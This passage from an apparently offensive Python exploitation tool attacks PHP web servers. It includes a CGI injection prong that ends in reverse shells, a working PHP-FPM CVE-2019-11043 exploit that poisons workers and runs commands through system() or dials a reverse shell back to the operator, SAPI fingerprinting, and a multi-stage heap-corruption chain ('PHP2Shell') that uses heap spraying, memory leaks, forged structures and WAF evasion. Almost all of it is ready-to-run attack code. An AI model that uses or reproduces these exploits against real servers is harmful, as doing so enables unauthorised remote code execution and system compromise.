                                     path=full_path):
                                try:
                                    resp = t.raw_request(
                                        "POST", path, body=payload,
                                        content_type=
                                        "application/x-www-form-urlencoded",
                                        read_cap=65536, timeout=90.0)
                                    m = re.match(rb"HTTP/1\.[01] (\d{3})",
                                                 resp[:40])
                                    if m and int(m.group(1)) >= 400:
                                        abort.set()
                                except OSError:
                                    abort.set()
                            threading.Thread(target=_run, daemon=True).start()

                            if _wait_new_session(listener, before,
                                                 min(remaining, 22.0), abort):
                                t.set_phase(Phase.GENERAL)
                                return (f"CGI prong ({cve}) - reverse shell "
                                        f"CONNECTED (interactive session on "
                                        f"port {listener.port})")
                            if abort.is_set():
                                t.log(f"[-] {flavor} payload dropped/rejected "
                                      "(connection error or HTTP >= 400) - "
                                      "aborting the callback wait")
                        t.log("[-] no callback within the window "
                              + ("(egress pre-check was inconclusive - "
                                 "egress filtering?)" if eg_ok is None
                                 else "(egress pre-check passed, so this "
                                      "looks like a payload problem)") +
                              "; falling back to command exec. Late "
                              "callbacks, if the shell finally dials home, "
                              "will still appear here and be offered "
                              "interactively at the end of the run.")

                # 2b) plain command execution with sentinel-wrapped proof
                resp = t.raw_request("POST", full_path, body=php_exec.encode(),
                                     content_type="application/x-www-form-urlencoded",
                                     read_cap=1 << 20, timeout=60.0)
                body = resp.split(b"\r\n\r\n", 1)[-1].decode("latin1", "replace")
                b_out = body.find("BEGIN_OUT")
                e_out = body.find("END_OUT")
                proof = (body[b_out + len("BEGIN_OUT"):e_out].strip()
                         if (b_out != -1 and e_out != -1 and e_out > b_out)
                         else "")
                if _proof_is_real(proof):
                    t.set_phase(Phase.GENERAL)
                    return f"CGI prong ({cve})" + (
                        f" - command output:\n{proof}" if proof else "")
                t.log(f"[-] prong 1 ({cve}): exec sent on {endpoint} but "
                      "sentinel-wrapped output was missing or contained "
                      "payload fragments - execution unverified; not "
                      "reporting PWNED")
                t.set_phase(Phase.GENERAL)
                return None
            except OSError:
                continue
    if t.was_status(Phase.CGI, 403) or t.was_status(Phase.CGI, 429):
        t.log(f"[-] prong 1: CGI injection missed - "
              f"{t.was_status(Phase.CGI, 403)}x403/"
              f"{t.was_status(Phase.CGI, 429)}x429 observed: a WAF is likely "
              "eating the query string")
    else:
        t.log("[-] prong 1: CGI injection missed")
    t.set_phase(Phase.GENERAL)
    return None


# ====================== prong 4: PHP-FPM underflow (CVE-2019-11043) ======================

FPM_AFFECTED_MINOR = {1: 33, 2: 24, 3: 11}            # PHP 7.x only
FPM_DETECT_PATH = "/PHP%0Aabcdefghijklmopqrstuv.php"  # fixed-length probe
FPM_POS_OFFSET = 34                                    # from php_fpm_rce.rb
FPM_SETTINGS = ("allow_url_include=On",
                "auto_prepend_file=php://input")
FPM_PROBE_TIMEOUT = 8.0


def fpm_version_gate(php_ver) -> bool:
    if php_ver is None:
        return True            # no banner: cheap probe decides
    if php_ver[0] != 7:
        return False
    fixed = FPM_AFFECTED_MINOR.get(php_ver[1])
    return fixed is not None and php_ver[2] < fixed


def fpm_prong(t: Target, cmd: str, php_ver, sapi_info: dict,
              listener: ShellListener | None = None, lhost: str | None = None,
              qmin: int = 1500, qmax: int = 2000, qstep: int = 5,
              tries: int = 4) -> str | None:
    """QSL detection probes the misconfigured fastcgi_split_path_info itself;
    the write chain triggers allow_url_include + auto_prepend_file=php://input
    (prong 1's exact exec interface), with php://input oracle retries since
    only one worker child is poisoned at a time."""
    server = (t.headers.get("server") or "").lower()
    # v9.5: CVE-2019-11043 also fires behind mod_proxy_fcgi (Apache) and
    # Caddy php_fastcgi; the QSL scan is the actual test, Server is only a
    # cheap pre-gate - exclude only obvious non-candidates.
    front_ok = (not server or any(k in server for k in
                ("nginx", "openresty", "apache", "caddy", "litespeed")))
    if not front_ok:
        t.log("[*] prong 4 skipped: front server does not look like a "
              "PHP-FPM-fronting proxy")
        return None
    if not fpm_version_gate(php_ver):
        v = php_ver
        t.log(f"[*] prong 4 skipped: banner {v[0]}.{v[1]}.{v[2]} is outside "
              "the CVE-2019-11043 range")
        return None

    qstep = max(1, qstep)               # v9.3: range() arg-3 guard

    script = t.path.partition("?")[0]
    if not script.endswith(".php") and sapi_info.get("entry"):
        script = sapi_info["entry"].partition("?")[0]
    t.set_phase(Phase.FPM)

    base_status, _ = t.get(script, read_cap=4096)
    if base_status == 500:
        t.log("[*] prong 4: entry script returns 500 at baseline - "
              "QSL oracle unusable")
        t.set_phase(Phase.GENERAL)
        return None

    # ---- QSL scan: 500 upstream OR 502 upstream-crash = candidate (v9.5) ----
    cands: list[int] = []
    fail_start = t.net_failures()
    n_steps = len(range(qmin, qmax + 1, qstep))
    for idx, qsl in enumerate(range(qmin, qmax + 1, qstep)):
        if idx % 20 == 0:                # v9.2: heartbeat - never go silent
            t.log(f"[*] prong 4: QSL scan {idx}/{n_steps} (qsl={qsl})")
        try:
            resp = t.raw_request("GET",
                                 f"{script}{FPM_DETECT_PATH}?{'A' * qsl}",
                                 read_cap=1 << 18, timeout=FPM_PROBE_TIMEOUT)
        except OSError:
            break
        t.note_leak(resp.split(b"\r\n\r\n", 1)[-1])
        m = re.match(rb"HTTP/1\.[01] (\d{3})", resp[:40])
        if m and int(m.group(1)) in (500, 502):   # v9.5: 502 counted
            cands.append(qsl)
        if t.net_failures() - fail_start >= 3:
            t.log("[-] prong 4: repeated net failures - target is "
                  "tarpitting or saturated; aborting QSL scan")
            break
    if not cands:
        t.log("[-] prong 4: no QSL candidates (target not CVE-2019-11043)")
        t.set_phase(Phase.GENERAL)
        return None
    t.log("[+] prong 4: QSL candidates "
          + str(cands[:8]) + ("..." if len(cands) > 8 else ""))

    # ---- settings write + verification via php://input oracle ----
    php_detect = f'<?php echo "{MARKER}"; die(); ?>'
    probe_len = len(f"{script}{FPM_DETECT_PATH}")
    for qsl in cands:
        for setting in FPM_SETTINGS:
            path = f"/PHP_VALUE%0A{setting}"
            path += ";" * max(0, FPM_POS_OFFSET - len(path))
            qsl_delta = probe_len - len(f"{script}{path}")
            if qsl_delta % 2:                      # keep the delta even
                qsl_delta += 1
            qs = "A" * max(0, qsl - qsl_delta // 2)
            try:
                t.raw_request("GET", f"{script}{path}?{qs}",
                              read_cap=4096, timeout=FPM_PROBE_TIMEOUT)
            except OSError:
                pass
        # only one poisoned worker at a time - retry the oracle
        for attempt in range(tries):
            try:
                resp = t.raw_request("POST", script, body=php_detect.encode(),
                                     content_type="application/x-www-form-urlencoded",
                                     read_cap=1 << 18, timeout=30.0)
            except OSError:
                continue
            if MARKER.encode() in resp.split(b"\r\n\r\n", 1)[-1]:
                t.log(f"[+] prong 4 HIT (CVE-2019-11043), qsl={qsl}, "
                      f"try {attempt + 1} - PHP-FPM worker poisoned")
                if listener is not None:
                    cb_host = lhost or local_ip_toward(t.host)
                    before = listener.count()
                    for flavor in ("unix", "windows"):
                        payload = php_shell_payload(cb_host, listener.port,
                                                   flavor).encode()
                        try:
                            t.raw_request("POST", script, body=payload,
                                          content_type="application/x-www-form-urlencoded",
                                          read_cap=65536, timeout=90.0)
                        except OSError:
                            pass
                        if _wait_new_session(listener, before, 22.0, None):
                            t.set_phase(Phase.GENERAL)
                            return (f"FPM prong (CVE-2019-11043) - reverse "
                                    f"shell CONNECTED (qsl={qsl})")
                    t.log("[-] no callback within the window - proving with "
                          "command exec instead")
                php_exec = ('<?php $c = base64_decode("%s"); echo "%s"; '
                            'system($c); echo "\\n%s"; die(); ?>') % (
                    base64.b64encode(cmd.encode()).decode(), MARKER, MARKER)
                try:
                    resp = t.raw_request("POST", script, body=php_exec.encode(),
                                         content_type="application/x-www-form-urlencoded",
                                         read_cap=1 << 20, timeout=60.0)
                except OSError:
                    resp = b""
                body = resp.split(b"\r\n\r\n", 1)[-1].decode("latin1", "replace")
                proof = (body.split(MARKER, 1)[1].rsplit(MARKER, 1)[0].strip()
                         if MARKER in body else "")
                t.set_phase(Phase.GENERAL)
                return f"FPM prong (CVE-2019-11043), qsl={qsl}" + (
                    f" - command output:\n{proof}" if proof else "")
    t.log("[-] prong 4: settings write did not verify (crashed workers, "
          "try_files present, or hardened build)")
    t.set_phase(Phase.GENERAL)
    return None


# ====================== SAPI detection + active-path location ======================

PHP_ENTRY_HINTS = [
    "index.php", "login.php", "wp-login.php", "admin.php",
    "info.php", "phpinfo.php",
]


def _looks_static(body: bytes) -> bool:
    """Default-server splash-page heuristic."""
    if not body or len(body) > 4096:
        return False
    low = body.lower()
    return (b"welcome to nginx" in low or b"welcome to apache" in low
            or b"it works!" in low
            or (b"nginx" in low and len(body) < 1024)
            or (b"apache" in low and len(body) < 1024))


def detect_sapi(t: Target, log) -> dict:
    """
    Behavioral SAPI fingerprinting (CGI prong immunity) plus active-PHP-path
    location: if the landing path is not a live script, common PHP entry
    points are probed and t.path retargeted, or the target marked static.
    """
    t.set_phase(Phase.SAPI)
    info = {"sapi": "unknown", "windows": None, "skip_cgi": False,
            "entry": None, "static": False}
    server = t.headers.get("server", "")
    low = server.lower()
    if "win32" in low or "win64" in low or "microsoft-iis" in low:
        info["windows"] = True
        info["sapi"] = "Windows CGI/FastCGI backend (banner hint)"

    probe = f"/phpomni-nonexist-{int(time.time()) % 100000}.php"
    try:
        status, body = t.get(probe, read_cap=65536)
    except OSError:
        log("[*] SAPI probe failed (no answer); keeping all prongs armed")
        t.set_phase(Phase.GENERAL)
        return info
    text = body.decode("latin1", "replace").strip()
    tl = text.lower()

    if "file not found" in tl and len(tl) < 200:
        info["sapi"] = "PHP-FPM/FastCGI (missing-script handler 'File not found.')"
        info["skip_cgi"] = True
    elif "no input file specified" in tl and len(tl) < 200:
        info["sapi"] = "PHP via FastCGI/FPM ('No input file specified.')"
        if low.startswith("nginx"):
            info["sapi"] = "nginx -> PHP-FPM"
            info["skip_cgi"] = True
    elif low.startswith("nginx"):
        info["sapi"] = "nginx front (PHP behind it, but not CGI-action style)"

    # ---- locate an *active* PHP entry point ----
    path_no_qs, _, qs = t.path.partition("?")
    root_php = "php" in (t.headers.get("x-powered-by") or "").lower()

    if not root_php and not path_no_qs.endswith(".php"):
        root_path = path_no_qs or "/"
        try:
            root_status, root_body = t.get(root_path, read_cap=65536)
        except OSError:
            root_status, root_body = 0, b""
        root_static = root_status in (200, 403) and _looks_static(root_body)

        for hint in PHP_ENTRY_HINTS:
            cand = "/" + hint + (("?" + qs) if qs else "")
            try:
                status, body = t.get(cand, read_cap=65536)
            except OSError:
                continue
            if status not in (200, 301, 302):
                continue
            hint_php = False
            try:
                h = split_headers(t.raw_request("HEAD", cand, read_cap=4096,
                                                timeout=15.0))
                hint_php = "php" in (h.get("x-powered-by") or "").lower()
            except OSError:
                pass
            differs = (root_body == b"" or body != root_body
                       or not _looks_static(body))
            if hint_php or differs:
                info["entry"] = cand
                if info["sapi"] == "unknown":
                    info["sapi"] = f"active PHP application entry ({cand})"
                log(f"[+] active PHP entry point located: {info['entry']} "
                    "(landing page was not the live script)")
                break
        if info["entry"] is None and root_static and not root_php:
            info["static"] = True
            info["sapi"] = "static HTML only (splash page, no active PHP found)"

    log(f"[*] SAPI detection: {info['sapi']}"
        + ("; CGI prong immune - will skip" if info["skip_cgi"] else
           "; CGI prong stays armed"))
    t.set_phase(Phase.GENERAL)
    return info


# ====================== prong 2+3: PHP2Shell (CVE-2026-109618 / 109619) ======================

BUILTIN_OFFSET_PROFILES: list[dict] = [
    {
        "name": "bookworm",
        "zif": 0x43A870, "dtor": 0x613C50, "htdata": 0x690D8,
        "stage1_n": 841, "stage2_t": 406, "stage2_v": 16,
        "stage3_pads": [(31, 31)] * 6, "stage3_carrier": True,
        "match": {"server": ["debian", "ubuntu"]},
    },
    {
        "name": "lab",
        "zif": 0x43A870, "dtor": 0x613C50, "htdata": 0x6E0D8,
        "stage1_n": 892, "stage2_t": 443, "stage2_v": 1,
        "stage3_pads": [(8, 7)] + [(7, 7)] * 5, "stage3_carrier": False,
        "match": None,
    },
]

_PROFILE_KEYS = ("zif", "dtor", "htdata", "stage1_n", "stage2_t", "stage2_v",
                 "stage3_carrier")


def _as_int(v):
    return int(v, 0) if isinstance(v, str) else int(v)


def _profile_matches(cand: dict, server: str, xpb: str) -> bool:
    m = cand.get("match") or {}
    skw = m.get("server") or []
    xkw = m.get("xpb") or []
    if not skw and not xkw:
        return False
    return (any(k in server for k in skw)
            or any(k in xpb for k in xkw))


def build_offset_candidates(args, t: Target, php_ver,
                            sapi_info: dict) -> list[dict]:
    """Ordered list of offset profiles for the PHP2Shell prong."""
    by_name = {p["name"]: dict(p) for p in BUILTIN_OFFSET_PROFILES}

    if args.zif_offset is not None or args.dtor_offset is not None \
            or args.htdata_offset is not None:
        cand = dict(by_name.get(args.profile, by_name["bookworm"]))
        if args.zif_offset is not None:
            cand["zif"] = args.zif_offset
        if args.dtor_offset is not None:
            cand["dtor"] = args.dtor_offset
        if args.htdata_offset is not None:
            cand["htdata"] = args.htdata_offset
        cand["name"] = "cli-overrides"
        cand["match"] = None
        t.log("[*] PHP2Shell offsets: single candidate from CLI overrides "
              f"(zif=0x{cand['zif']:x} dtor=0x{cand['dtor']:x} "
              f"htdata=0x{cand['htdata']:x})")
        return [cand]

    pool = [dict(p) for p in BUILTIN_OFFSET_PROFILES]

    if args.offsets_json:
        loaded = []
        try:
            with open(args.offsets_json, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                data = [data]
            for up in data:
                cand = dict(by_name["bookworm"])
                for k in _PROFILE_KEYS:
                    if k in up:
                        cand[k] = _as_int(up[k]) if k != "stage3_carrier" \
                            else bool(up[k])
                if "stage3_pads" in up:
                    cand["stage3_pads"] = [tuple(p) for p in up["stage3_pads"]]
                cand["name"] = str(up.get("name", "user-profile"))
                cand["match"] = up.get("match") \
                    if isinstance(up.get("match"), dict) else None
                loaded.append(cand)
            t.log(f"[*] loaded {len(loaded)} offset profile(s) from "
                  f"{args.offsets_json}")
        except (OSError, ValueError) as e:
            t.log(f"[-] could not load --offsets-json: {e}")
        pool = loaded + pool

    server = (t.headers.get("server") or "").lower()
    xpb = (t.headers.get("x-powered-by") or "").lower()

    matched = [c for c in pool if _profile_matches(c, server, xpb)]
    rest = [c for c in pool if not _profile_matches(c, server, xpb)]

    ordered: list[dict] = []
    seen: set[str] = set()
    for c in matched + rest:
        if c["name"] in seen:
            continue
        seen.add(c["name"])
        ordered.append(c)

    if args.profile:
        ordered.sort(key=lambda c: 0 if c["name"] == args.profile else 1)

    if sapi_info.get("windows"):
        t.log("[*] note: banner hints at a Windows target; PHP2Shell offsets "
              "are Linux libphp.so layouts - the stage-2 leak will decide")
    basis = ("fingerprint hit on Server/X-Powered-By" if matched
             else "no exact fingerprint match - built-in image layout assumed "
                  "first, remaining profiles as fallbacks")
    t.log("[*] PHP2Shell offset candidates: "
          + ", ".join(c["name"] for c in ordered)
          + f" ({basis}; stage-1 leak is ground truth)")
    return ordered


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"(?i)Set-Cookie:\s*PHPSESSID=([^\r\n]*)", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Php2ShellExploit:
    def __init__(self, target: Target, cmd: str, cfg: dict,
                 huge_mb: int = 12, verbose: bool = True):
        self.t = target
        self.cmd = cmd.encode()
        self.cfg = cfg
        self.huge_mb = huge_mb
        self.verbose = verbose

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def heap_spray(self, cycles: int) -> None:
        """
        Varied-shape multipart POSTs (randomized field counts and sizes)
        carrying a live session, sent before the leak stage: worker heaps
        converge onto a repeatable allocation pattern, normalizing the remote
        memory layout across distros/builds. No OOM field - pure alignment
        prep that cannot crash the worker.
        """
        self.t.set_phase(Phase.SPRAY)
        for cycle in range(cycles):
            parts = [
                {"name": "PHPSESSID", "data": SID},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"spray"},
            ]
            n_fields = random.randrange(240, 900)
            for i in range(n_fields):
                parts.append({
                    "name": f"s{cycle:02d}x{i:04d}"[:20],
                    "data": bytes([65 + (i % 26)]) * random.randrange(40, 600),
                })
            try:
                self.t.post(self.t.mp(parts, b"Y" * 12), b"Y" * 12,
                            read_cap=4096, timeout=25.0)
            except OSError:
                pass
            time.sleep(0.05)
        self.t.set_phase(Phase.GENERAL)

    def rotate(self) -> None:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(self.t.mp(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(self.t.mp(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        self.t.set_phase(Phase.STAGE1)
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(self.t.mp(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.cfg["stage1_n"]):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(self.t.mp(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        self.t.set_phase(Phase.GENERAL)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        self.t.set_phase(Phase.STAGE2)
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(self.t.mp(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.cfg["stage2_t"] else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]"[:24],
                              "data": b"x" * self.cfg["stage2_v"]})
        resp = self.t.post(self.t.mp(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        self.t.set_phase(Phase.GENERAL)
        return libphp_base_from_cookie(parse_cookie(resp), self.cfg["dtor"])

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(f"command is {len(cmd)} bytes; max {MAX_CMD} "
                              f"(use 'sh</path/to/file' chaining)")
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        self.t.set_phase(Phase.STAGE3)
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.cfg["stage3_pads"]):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.cfg.get("stage3_carrier"):
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(self.t.mp(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.cfg.get("stage3_carrier"):
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(self.t.mp(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)
        self.t.set_phase(Phase.GENERAL)


STATUS_HINTS = [
    (413, "request body too large for the server (client_max_body_size / "
          "LimitRequestBody) - transport cap learned in stage 1; escalations "
          "already clamped"),
    (403, "WAF/hardening likely blocking the payload (mod_security, "
          "Apache rules, edge filter)"),
    (429, "rate limiting - the target is throttling us"),
    (502, "upstream worker crashed mid-chain (OOM phase may have fired); "
          "also an FPM QSL-scan candidate signal"),
    (503, "service unavailable - workers exhausted or restarting"),
]


def diagnose(t: Target) -> str:
    """Turn phase-tagged status/network history into operator guidance."""
    hints: list[str] = []
    for ph, counts in t.phase_status.items():
        for code, hint in STATUS_HINTS:
            n = counts.get(code, 0)
            if n:
                hints.append(f"{ph}: {n}x HTTP {code} ({hint})")
    errs = t.net_failures()
    if errs:
        hints.append(f"{errs}x connection reset/timeout "
                     "(possible WAF drop or worker under load)")
    return "; ".join(hints)


def php2shell_prong(t: Target, cmd: str, php_ver: tuple[int, int, int] | None,
                    candidates: list[dict], retries: int = 3, force: bool = False,
                    trust_banner: bool = False, huge_mb: int = 12,
                    huge_mb_max: int = 128, no_pre_rotate: bool = False,
                    spray_cycles: int = 6, pin_workers: int = 1) -> str | None:
    """Fail-open gating; the stage-1 heap leak is the definitive test.
    v9.6.1: pin default is 1 (pinning == pm.max_children deadlocks the
    chain's own requests behind the pins)."""
    if php_ver and not force:
        if php_ver[0] < 8 or (php_ver[0] == 8 and php_ver[1] <= 1):
            t.log(f"[*] prong 2+3 skipped: banner claims PHP "
                  f"{php_ver[0]}.{php_ver[1]}.{php_ver[2]} (legacy engine; "
                  "--force overrides)")
            return None
        if php_ver[0] >= 9:
            t.log(f"[*] prong 2+3 skipped: banner claims PHP {php_ver[0]} "
                  "(post-affected)")
            return None
        if trust_banner and in_version(php_ver, PHP2SHELL_PATCHED):
            t.log("[*] prong 2+3 skipped: banner claims a patched version "
                  f"({php_ver[0]}.{php_ver[1]}.{php_ver[2]}) and "
                  "--trust-banner is set")
            return None
    if php_ver and in_version(php_ver, PHP2SHELL_PATCHED) \
            and not trust_banner and not force:
        t.log("[*] banner claims patched but is backport-ambiguous - still "
              "firing (use --trust-banner to skip these)")

    if len(cmd.encode()) > MAX_CMD:
        t.log(f"[-] prong 2+3: command exceeds the {MAX_CMD}-byte carrier "
              f"limit ({len(cmd.encode())} bytes); use a short trigger like "
              "'sh</out/c'. Skipping prong 2+3.")
        return None
    if not candidates:
        t.log("[-] prong 2+3: no offset candidates available")
        return None
    if huge_mb_max < 4:
        huge_mb_max = 4
    if huge_mb > huge_mb_max:
        huge_mb = huge_mb_max

    # v9.6.1: pin via stalled POSTs for the WHOLE chain; unpinned, a
    # multi-worker front round-robins the A/B requests to different children
    # and the leak fails. try/finally guarantees release even on crash.
    if pin_workers > 0:
        t.pin(pin_workers)
    try:
        return _php2shell_chain(t, cmd, php_ver, candidates, retries, force,
                               trust_banner, huge_mb, huge_mb_max,
                               no_pre_rotate, spray_cycles)
    finally:
        if pin_workers > 0:
            t.unpin()


def _php2shell_chain(t: Target, cmd: str, php_ver, candidates: list[dict],
                     retries: int, force: bool, trust_banner: bool,
                     huge_mb: int, huge_mb_max: int, no_pre_rotate: bool,
                     spray_cycles: int) -> str | None:
    primary = candidates[0]
    ex = Php2ShellExploit(t, cmd, primary, huge_mb=huge_mb, verbose=t.verbose)
    t.log(f"[*] prong 2+3 primary layout '{primary['name']}': "
          f"zif=0x{primary['zif']:x} dtor=0x{primary['dtor']:x} "
          f"htdata=0x{primary['htdata']:x}")

    if not no_pre_rotate:
        ex.rotate()
    if spray_cycles > 0:
        t.log(f"[*] heap spray: {spray_cycles} varied-shape grooming "
              "request(s) normalizing the worker heap before stage 1")
        ex.heap_spray(spray_cycles)

    # ---- stage 1: heap leak (self-adjusting OOM field, v9.4.1) ----
    chunk = 0
    oom_confirmed = False
    transport_cap: int | None = None
    attempts_left = retries
    attempt = 0
    oom_survives = 0

    while True:
        attempt += 1
        t.log(f"[*] stage 1: heap leak (attempt {attempt}, "
              f"{attempts_left} miss(es) left, field={ex.huge_mb}MB)")
        had_error = False
        try:
            chunk = ex.stage1()
        except OSError as e:
            t.log(f"[-] request error: {e}")
            if ex.huge_mb > 12:
                t.log("[*] the >12MB prelude died mid-flight - the OOM "
                      "phase is working; treating as prelude success")
                oom_confirmed = True
                break
            had_error = True
            chunk = 0
        if chunk:
            t.log(f"[+] chunk base = 0x{chunk:x}")
            break

        if had_error:
            oom_survives = 0
            attempts_left -= 1
            t.log(f"[-] connection-level miss at {ex.huge_mb}MB "
                  f"({attempts_left} left)")
            if attempts_left <= 0:
                break
        elif t.last_status == 413:
            proposal = int(ex.huge_mb * 0.75)
            transport_cap = (proposal if transport_cap is None
                            else min(transport_cap, proposal))
            oom_survives = 0
            t.log(f"[*] HTTP 413 during stage 1 - transport body cap "
                  f"learned; ceiling clamped to {transport_cap}MB (was "
                  f"probing {ex.huge_mb}MB). No retry consumed.")
            if transport_cap < 4:
                t.log("[*] transport cap floored below 4MB - no useful OOM "
                      "prelude is possible; aborting stage-1 escalation")
                break
            ex.huge_mb = min(ex.huge_mb, transport_cap)
        elif t.last_status in (502, 503):
            oom_survives = 0
            attempts_left -= 1
            t.log(f"[-] worker crashed during the probe (HTTP "
                  f"{t.last_status}) - miss ({attempts_left} left)")
            if attempts_left <= 0:
                break
        else:
            if t.last_status == 0 and t.net_failures() >= 3:
                t.log("[-] stage 1: 3+ net failures and empty responses - "
                      "target looks dead; stopping leak retries early")
                break
            ceiling = huge_mb_max if transport_cap is None \
                else min(huge_mb_max, transport_cap)
            if ex.huge_mb < ceiling:
                oom_survives += 1
                if oom_survives >= 2:
                    old = ex.huge_mb
                    ex.huge_mb = min(ceiling, ex.huge_mb * 2)
                    oom_survives = 0
                    t.log(f"[*] worker survived the OOM prelude at {old}MB "
                          f"- scaling the field to {ex.huge_mb}MB (cap "
                          f"{ceiling}MB; no retry consumed)")
            else:
                oom_survives += 1
                attempts_left -= 1
                t.log(f"[-] heap leak missed at the {ex.huge_mb}MB ceiling "
                      f"({attempts_left} left)")
                if attempts_left <= 0:
                    break

        if t.was_status(Phase.SPRAY, 403) or t.was_status(Phase.STAGE1, 403):
            nm = t.rotate_mp_mask()
            t.log(f"[*] WAF-shaped 403s observed - rotating multipart mask "
